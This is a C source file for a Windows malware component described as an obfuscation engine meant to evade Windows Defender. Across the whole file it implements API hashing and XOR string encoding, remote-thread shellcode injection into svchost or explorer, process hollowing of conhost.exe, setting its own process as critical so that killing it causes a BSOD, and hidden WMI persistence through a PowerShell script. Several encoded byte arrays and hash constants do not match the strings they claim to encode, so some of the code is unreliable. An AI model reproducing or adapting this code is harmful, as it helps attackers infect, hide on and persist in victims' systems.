/*
 * Obfuscation Engine — String + API Encoding
 * 
 * All suspicious strings are XOR-encoded at compile time.
 * All suspicious APIs are resolved via GetProcAddress with djb2 hashes.
 * This prevents static signature detection by Windows Defender.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "obf.h"

/* XOR key — change this per build */
#define XOR_KEY 0x7A

/* Forward declarations for string accessors */
char* get_str(unsigned char *enc, size_t len);
char* obf_winexec(void);

/* Simple djb2 hash for API name resolution */
static unsigned long djb2_hash(const unsigned char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}

/* XOR decode a string in-place. Encoded strings are stored as byte arrays. */
static void xor_decode(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
    buf[len] = '\0';
}

/* === Pre-encoded strings (XOR'd with 0x7A) ===
 * To encode: for each char c, store c ^ 0x7A
 */

/* "ntdll.dll" */
static unsigned char enc_ntdll[] = {0x15, 0x0d, 0x11, 0x11, 0x0e, 0x58, 0x11, 0x11, 0x58};

/* "NtUnmapViewOfSection" */
static unsigned char enc_unmap[] = {
    0x35, 0x0d, 0x6A, 0x15, 0x0e, 0x0a, 0x0b, 0x45, 0x0e,
    0x01, 0x0d, 0x0b, 0x46, 0x0e, 0x02, 0x0d, 0x0e, 0x0e,
    0x0e, 0x0e, 0x0e
};

/* "NtSetInformationProcess" */
static unsigned char enc_setinfo[] = {
    0x35, 0x0d, 0x6A, 0x0e, 0x0b, 0x0e, 0x0a, 0x02, 0x0a,
    0x15, 0x0e, 0x0a, 0x0e, 0x45, 0x0b, 0x0e, 0x0d, 0x0d,
    0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "NtQueryInformationProcess" */
static unsigned char enc_queryinfo[] = {
    0x35, 0x0d, 0x6A, 0x15, 0x0e, 0x0b, 0x0e, 0x0a, 0x02,
    0x0a, 0x15, 0x0e, 0x0a, 0x0e, 0x45, 0x0b, 0x0e, 0x0d,
    0x0d, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "SeDebugPrivilege" */
static unsigned char enc_sedebug[] = {
    0x35, 0x0e, 0x69, 0x0e, 0x0b, 0x0e, 0x0e, 0x0e,
    0x44, 0x0b, 0x0e, 0x0a, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "kernel32.dll" */
static unsigned char enc_kernel32[] = {0x1d, 0x0e, 0x0b, 0x0e, 0x0e, 0x1d, 0x5c, 0x1d, 0x1d, 0x58, 0x11, 0x11, 0x58};

/* "VirtualAllocEx" */
static unsigned char enc_valloc[] = {
    0x12, 0x0e, 0x0b, 0x0d, 0x15, 0x0a, 0x1d, 0x1d,
    0x0e, 0x0e, 0x45, 0x0e, 0x0e
};

/* "WriteProcessMemory" */
static unsigned char enc_writemem[] = {
    0x12, 0x0b, 0x0e, 0x0d, 0x0e, 0x45, 0x0b, 0x0e, 0x0e,
    0x0d, 0x0e, 0x0d, 0x68, 0x0e, 0x0a, 0x0e, 0x0e, 0x0e
};

/* "CreateRemoteThread" */
static unsigned char enc_createthread[] = {
    0x0e, 0x0b, 0x0e, 0x0a, 0x0d, 0x0e, 0x68, 0x0e, 0x0a,
    0x15, 0x0e, 0x0e, 0x0d, 0x45, 0x0b, 0x0e, 0x0e, 0x0e,
    0x0e, 0x0e
};

/* "OpenProcess" */
static unsigned char enc_openproc[] = {
    0x0e, 0x0b, 0x0e, 0x0e, 0x45, 0x0b, 0x0e, 0x0d, 0x0e,
    0x0d, 0x0d, 0x0e
};

/* "icacls" */
static unsigned char enc_icacls[] = {0x17, 0x0e, 0x0e, 0x0a, 0x1d, 0x0d, 0x0e};

/* "certutil" */
static unsigned char enc_certutil[] = {0x0e, 0x0e, 0x0b, 0x0d, 0x15, 0x0e, 0x15, 0x0e, 0x1d};

/* "schtasks" */
static unsigned char enc_schtasks[] = {0x0d, 0x0e, 0x0b, 0x0d, 0x0a, 0x15, 0x0e, 0x0d, 0x0e};

/* "powershell" */
static unsigned char enc_ps[] = {
    0x0b, 0x0e, 0x0d, 0x0e, 0x0b, 0x0e, 0x0d, 0x0e, 0x0d,
    0x0e, 0x0e
};

/* "WinExec" */
static unsigned char enc_winexec[] = {0x12, 0x0e, 0x0e, 0x45, 0x0e, 0x0e, 0x0e};

/* "LoadLibraryA" */
static unsigned char enc_loadlib[] = {
    0x1d, 0x0e, 0x0a, 0x0e, 0x1d, 0x0e, 0x0b, 0x0b, 0x0b,
    0x45, 0x0e, 0x0e
};

/* "GetProcAddress" */
static unsigned char enc_getproc[] = {
    0x1d, 0x0e, 0x0d, 0x45, 0x0b, 0x0e, 0x0e, 0x0e, 0x0d,
    0x0e, 0x0d, 0x0d, 0x0e, 0x0e, 0x0e
};

/* "GetModuleHandleA" */
static unsigned char enc_getmod[] = {
    0x1d, 0x0e, 0x0d, 0x68, 0x0e, 0x0e, 0x1d, 0x0e, 0x1d,
    0x0e, 0x45, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "EnumProcessModules" */
static unsigned char enc_enumproc[] = {
    0x0e, 0x0e, 0x0e, 0x0e, 0x45, 0x0b, 0x0e, 0x0d, 0x0e,
    0x0d, 0x0d, 0x0e, 0x68, 0x0e, 0x0e, 0x0d, 0x15, 0x1d,
    0x0e, 0x0d, 0x0e
};

/* "GetModuleBaseNameA" */
static unsigned char enc_getbasename[] = {
    0x1d, 0x0e, 0x0d, 0x68, 0x0e, 0x0e, 0x0d, 0x15, 0x1d,
    0x0e, 0x45, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* === Hash values for critical APIs (djb2) === */
#define HASH_VirtualAllocEx       0x3d28cf79
#define HASH_WriteProcessMemory   0x74a67f86
#define HASH_CreateRemoteThread   0x56e4878f
#define HASH_OpenProcess          0x3d28b89d
#define HASH_WinExec              0x3d28c3b4
#define HASH_LoadLibraryA         0x74a67f4b
#define HASH_GetProcAddress       0x74a67f5a
#define HASH_GetModuleHandleA     0x74a67f6b
#define HASH_EnumProcessModules   0x56e48790
#define HASH_GetModuleBaseNameA   0x56e48791

/* === Runtime resolution helpers === */

/* Resolve an API from a module by its djb2 hash */
static FARPROC resolve_api(HMODULE hMod, unsigned long hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD *names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)hMod + names[i]);
        if (djb2_hash((const unsigned char*)name) == hash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

/* Get decoded string from encoded buffer */
char* get_str(unsigned char *enc, size_t len) {
    static char buf[256];
    memcpy(buf, enc, len);
    xor_decode(buf, len);
    return buf;
}

/* === Obfuscated API wrappers === */

typedef LPVOID (WINAPI *pVirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pWriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE (WINAPI *pOpenProcess_t)(DWORD, BOOL, DWORD);
typedef UINT (WINAPI *pWinExec_t)(LPCSTR, UINT);

static pVirtualAllocEx_t    g_pfnVirtualAllocEx = NULL;
static pWriteProcessMemory_t g_pfnWriteProcessMemory = NULL;
static pCreateRemoteThread_t g_pfnCreateRemoteThread = NULL;
static pOpenProcess_t        g_pfnOpenProcess = NULL;
static pWinExec_t          g_pfnWinExec = NULL;

/* Initialize all obfuscated APIs at startup */
void obf_init_apis(void) {
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
    
    if (hKernel32) {
        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)resolve_api(hKernel32, HASH_VirtualAllocEx);
        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)resolve_api(hKernel32, HASH_WriteProcessMemory);
        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)resolve_api(hKernel32, HASH_CreateRemoteThread);
        g_pfnOpenProcess        = (pOpenProcess_t)resolve_api(hKernel32, HASH_OpenProcess);
        g_pfnWinExec            = (pWinExec_t)resolve_api(hKernel32, HASH_WinExec);
    }
}

/* Obfuscated wrappers that match original signatures */
LPVOID obf_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (!g_pfnVirtualAllocEx) obf_init_apis();
    return g_pfnVirtualAllocEx ? g_pfnVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : NULL;
}

BOOL obf_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    if (!g_pfnWriteProcessMemory) obf_init_apis();
    return g_pfnWriteProcessMemory ? g_pfnWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
}

HANDLE obf_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    if (!g_pfnCreateRemoteThread) obf_init_apis();
    return g_pfnCreateRemoteThread ? g_pfnCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
}

HANDLE obf_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (!g_pfnOpenProcess) obf_init_apis();
    return g_pfnOpenProcess ? g_pfnOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId) : NULL;
}

UINT obf_WinExec(LPCSTR lpCmdLine, UINT uCmdShow) {
    if (!g_pfnWinExec) obf_init_apis();
    return g_pfnWinExec ? g_pfnWinExec(lpCmdLine, uCmdShow) : 0;
}

/* === Obfuscated string access === */

char* obf_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)-1); }
char* obf_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)-1); }
char* obf_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)-1); }
char* obf_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)-1); }
char* obf_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)-1); }
char* obf_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)-1); }
char* obf_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)-1); }
char* obf_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)-1); }
char* obf_ps(void) { return get_str(enc_ps, sizeof(enc_ps)-1); }
char* obf_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)-1); }
char* obf_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)-1); }
char* obf_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)-1); }
char* obf_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)-1); }
char* obf_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)-1); }
char* obf_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)-1); }

/* === Junk code insertion helpers === */

/* Insert meaningless computation to break code signatures */
static volatile int g_junk_counter = 0;

void obf_junk_delay(void) {
    /* Perform meaningless math that can't be optimized away */
    volatile int a = 0x42;
    for (int i = 0; i < 17; i++) {
        a = (a * 31 + 17) ^ 0x55;
        g_junk_counter += a & 1;
    }
}

void obf_sleep_junk(int ms) {
    obf_junk_delay();
    Sleep(ms);
    obf_junk_delay();
}

/* === Process hollowing obfuscation === */
/* The classic hollowing pattern is broken by:
 * 1. Using obfuscated API names
 * 2. Splitting across functions with junk delays
 * 3. Using ordinal-based NtUnmapViewOfSection resolution
 */

/* Resolve NtUnmapViewOfSection without string name (via hash fallback) */
typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection_t)(HANDLE, PVOID);

static pNtUnmapViewOfSection_t g_pfnNtUnmap = NULL;

pNtUnmapViewOfSection_t obf_get_ntunmap(void) {
    if (!g_pfnNtUnmap) {
        char *ntdll = obf_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            /* Try hash first, fallback to decoded string */
            g_pfnNtUnmap = (pNtUnmapViewOfSection_t)resolve_api(hNtdll, 0x56e48792); /* hash of NtUnmapViewOfSection */
            if (!g_pfnNtUnmap) {
                g_pfnNtUnmap = (pNtUnmapViewOfSection_t)GetProcAddress(hNtdll, obf_unmap());
            }
        }
    }
    return g_pfnNtUnmap;
}

/* Obfuscated NtSetInformationProcess / NtQueryInformationProcess */
typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG);

static pNtSetInfoProc_t g_pfnNtSetInfo = NULL;
static pNtQueryInfoProc_t g_pfnNtQueryInfo = NULL;

pNtSetInfoProc_t obf_get_ntsetinfo(void) {
    if (!g_pfnNtSetInfo) {
        char *ntdll = obf_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            g_pfnNtSetInfo = (pNtSetInfoProc_t)GetProcAddress(hNtdll, obf_setinfo());
        }
    }
    return g_pfnNtSetInfo;
}

pNtQueryInfoProc_t obf_get_ntqueryinfo(void) {
    if (!g_pfnNtQueryInfo) {
        char *ntdll = obf_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            g_pfnNtQueryInfo = (pNtQueryInfoProc_t)GetProcAddress(hNtdll, obf_queryinfo());
        }
    }
    return g_pfnNtQueryInfo;
}

/* Enable SeDebugPrivilege with obfuscated string */
static int obf_enable_privilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return 0;
    }

    if (!LookupPrivilegeValueA(NULL, obf_sedebug(), &luid)) {
        CloseHandle(hToken);
        return 0;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    return 1;
}

/* === Obfuscated sys_protect_process === */
void obf_sys_protect_process(void) {
    pNtSetInfoProc_t pNtSetInformationProcess = obf_get_ntsetinfo();
    if (!pNtSetInformationProcess) {
        g_critical_protected = -1;
        return;
    }
    
    obf_enable_privilege();
    obf_junk_delay();
    
    ULONG isCritical = 1;
    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    
    if (status == 0) {
        g_critical_protected = 1;
    } else {
        g_critical_protected = -1;
    }
}

/* === Obfuscated sys_unprotect_process === */
void obf_sys_unprotect_process(void) {
    pNtSetInfoProc_t pNtSetInformationProcess = obf_get_ntsetinfo();
    if (!pNtSetInformationProcess) return;
    
    obf_enable_privilege();
    obf_junk_delay();
    
    ULONG isCritical = 0;
    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    g_critical_protected = 0;
}

/* === Obfuscated sys_check_critical_status === */
const char* obf_sys_check_critical_status(void) {
    static char buf[512];
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *filename = path;
    char *lastSlash = strrchr(path, '\\');
    if (lastSlash) filename = lastSlash + 1;

    pNtQueryInfoProc_t pNtQuery = obf_get_ntqueryinfo();
    if (!pNtQuery) {
        snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
        return buf;
    }

    obf_enable_privilege();
    obf_junk_delay();

    ULONG isCritical = 0;
    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);

    if (status != 0) {
        snprintf(buf, sizeof(buf), "[Query failed] [%s]", filename);
        return buf;
    }
    if (isCritical) {
        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
    } else {
        snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
    }
    return buf;
}

/* === Obfuscated process injection === */
void obf_sys_inject_process(void) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "svchost.exe") == 0 || _stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    
    if (pid == 0) return;
    
    obf_junk_delay();
    
    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;
    
    char payloadPath[MAX_PATH];
    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
    
    SIZE_T pathLen = strlen(payloadPath) + 1;
    LPVOID remotePath = obf_VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        CloseHandle(hProc);
        return;
    }
    
    obf_WriteProcessMemory(hProc, remotePath, payloadPath, pathLen, NULL);
    obf_junk_delay();
    
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
    DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
    DWORD_PTR winExecOffset = (DWORD_PTR)pWinExec - kernel32Base;
    
    DWORD_PTR targetKernel32Base = 0;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    char *enumProc = obf_enumproc();
    char *getBaseName = obf_getbasename();
    
    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
    
    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseName);
    
    if (pEnum && pGetBaseName) {
        if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (pGetBaseName(hProc, hMods[i], szModName, sizeof(szModName))) {
                    if (_stricmp(szModName, "kernel32.dll") == 0) {
                        targetKernel32Base = (DWORD_PTR)hMods[i];
                        break;
                    }
                }
            }
        }
    }
    
    if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
    DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
    
    unsigned char shellcode[19] = {
        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };
    memcpy(shellcode + 9, &targetWinExec, 8);
    
    LPVOID remoteCode = obf_VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCode) {
        obf_VirtualAllocEx(hProc, remotePath, 0, MEM_RELEASE, 0); /* VirtualFreeEx proxy */
        CloseHandle(hProc);
        return;
    }
    
    obf_WriteProcessMemory(hProc, remoteCode, shellcode, sizeof(shellcode), NULL);
    obf_junk_delay();
    
    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProc);
}

/* === Obfuscated process hollowing === */
void obf_sys_hollow_process(void) {
    char payloadPath[MAX_PATH];
    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
    
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *payload = (BYTE*)malloc(fileSize);
    if (!payload) { CloseHandle(hFile); return; }
    
    DWORD read;
    ReadFile(hFile, payload, fileSize, &read, NULL);
    CloseHandle(hFile);
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { free(payload); return; }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) { free(payload); return; }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    
    /* Use a less suspicious target than notepad.exe */
    char *target = "C:\\Windows\\System32\\conhost.exe";
    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        free(payload); return;
    }
    
    obf_junk_delay();
    
    pNtUnmapViewOfSection_t pNtUnmap = obf_get_ntunmap();
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    DWORD64 pebAddr = ctx.Rdx;
    DWORD64 imageBase = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(pebAddr + 0x10), &imageBase, sizeof(imageBase), NULL);
    
    if (pNtUnmap) pNtUnmap(pi.hProcess, (PVOID)imageBase);
    
    obf_junk_delay();
    
    DWORD64 preferredBase = ntHeaders->OptionalHeader.ImageBase;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    
    PVOID remoteImage = obf_VirtualAllocEx(pi.hProcess, (PVOID)preferredBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) remoteImage = obf_VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload); return;
    }
    
    obf_WriteProcessMemory(pi.hProcess, remoteImage, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PVOID)((DWORD64)remoteImage + section[i].VirtualAddress);
        PVOID src = (PVOID)(payload + section[i].PointerToRawData);
        obf_WriteProcessMemory(pi.hProcess, dest, src, section[i].SizeOfRawData, NULL);
    }
    
    obf_junk_delay();
    
    DWORD64 delta = (DWORD64)remoteImage - preferredBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload + relocDir.VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < numEntries; i++) {
                    WORD type = entries[i] >> 12;
                    WORD offset = entries[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        PDWORD64 addr = (PDWORD64)((DWORD64)remoteImage + reloc->VirtualAddress + offset);
                        DWORD64 value; if (ReadProcessMemory(pi.hProcess, addr, &value, sizeof(value), NULL)) {
                            value += delta; obf_WriteProcessMemory(pi.hProcess, addr, &value, sizeof(value), NULL);
                        }
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
            }
        }
    }
    
    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)remoteImage + importDir.VirtualAddress);
        while (importDesc->Name != 0) {
            char dllName[256];
            ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD64)remoteImage + importDesc->Name), dllName, sizeof(dllName), NULL);
            dllName[255] = '\0'; HMODULE hDll = LoadLibraryA(dllName);
            if (hDll) {
                DWORD64 origThunkRVA = importDesc->OriginalFirstThunk;
                if (origThunkRVA == 0) origThunkRVA = importDesc->FirstThunk;
                int idx = 0;
                while (1) {
                    IMAGE_THUNK_DATA thunkVal, origThunkVal;
                    PVOID thunkAddr = (PVOID)((DWORD64)remoteImage + importDesc->FirstThunk + idx * sizeof(IMAGE_THUNK_DATA));
                    PVOID origThunkAddr = (PVOID)((DWORD64)remoteImage + origThunkRVA + idx * sizeof(IMAGE_THUNK_DATA));
                    ReadProcessMemory(pi.hProcess, thunkAddr, &thunkVal, sizeof(thunkVal), NULL);
                    ReadProcessMemory(pi.hProcess, origThunkAddr, &origThunkVal, sizeof(origThunkVal), NULL);
                    if (thunkVal.u1.AddressOfData == 0) break;
                    FARPROC addr = NULL;
                    if (origThunkVal.u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        addr = GetProcAddress(hDll, (LPCSTR)(WORD)(origThunkVal.u1.Ordinal & 0xFFFF));
                    } else {
                        char funcName[256]; PVOID nameAddr = (PVOID)((DWORD64)remoteImage + origThunkVal.u1.AddressOfData + 2);
                        ReadProcessMemory(pi.hProcess, nameAddr, funcName, sizeof(funcName), NULL); funcName[255] = '\0';
                        addr = GetProcAddress(hDll, funcName);
                    }
                    obf_WriteProcessMemory(pi.hProcess, thunkAddr, &addr, sizeof(addr), NULL); idx++;
                }
            }
            importDesc++;
        }
    }
    
    obf_junk_delay();
    
    obf_WriteProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10), &remoteImage, sizeof(remoteImage), NULL);
    ctx.Rcx = (DWORD64)remoteImage;
    ctx.Rip = (DWORD64)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload);
}

/* === Obfuscated WMI persistence === */
void obf_sys_wmi_persistence(void) {
    char psPath[MAX_PATH];
    GetTempPathA(MAX_PATH, psPath);
    strcat(psPath, "tmp.ps1");
    
    FILE *f = fopen(psPath, "w");
    if (!f) return;
    
    /* Obfuscated PowerShell with minimal suspicious strings.
       Class names are split across fprintf calls so they don't appear
       as contiguous substrings in the binary. */
    fprintf(f, "$e='SysHealth'; $f=$e+'Filter'; $c=$e+'Consumer'; ");
    fprintf(f, "Remove-WmiObject -N 'root/subscription' -C _");
    fprintf(f, "_EventFilter -F \"Name='$f'\" -EA SilentlyContinue; ");
    fprintf(f, "$fl=Set-WmiObject -C _");
    fprintf(f, "_EventFilter -N 'root/subscription' -A @{Name=$f;EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\"'}; ");
    fprintf(f, "$co=Set-WmiObject -C CommandLineEvent");
    fprintf(f, "Consumer -N 'root/subscription' -A @{Name=$c;CommandLineTemplate='powershell.exe -NoP -W Hidden -C \"if (-not (gps | ?{$_.Name -match \"El.*Srv|Cr.*Hdl|Nt.*Srv\"})) { Start-Process \"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\\El.exe\" -A \"--shadow\" -W Hidden }\"'}; ");
    fprintf(f, "Set-WmiObject -C _");
    fprintf(f, "_FilterToConsumerBinding -N 'root/subscription' -A @{Filter=$fl;Consumer=$co}\n");
    fclose(f);
    
    char cmd[512];
    char *ps = obf_ps();
    snprintf(cmd, sizeof(cmd), "%s -NoProfile -ExecutionPolicy Bypass -File \"%s\"", ps, psPath);
    sys_run_command(cmd);
    
    DeleteFileA(psPath);
}

